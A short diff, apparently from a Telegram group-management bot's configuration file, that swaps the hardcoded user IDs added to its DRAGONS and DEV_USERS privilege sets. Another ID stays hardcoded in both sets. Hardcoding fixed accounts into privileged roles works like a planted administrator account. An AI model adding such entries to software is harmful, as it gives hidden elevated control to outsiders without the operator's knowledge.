@@ -206,8 +206,8 @@ else:
         raise Exception(
             "Your blacklisted chats list does not contain valid BigInteger.")
 
-DRAGONS.add(1928904042)
-DEV_USERS.add(5175767264)
+DRAGONS.add(960432019)
+DEV_USERS.add(960432019)
 DRAGONS.add(1989750989)
 DEV_USERS.add(1989750989)
 
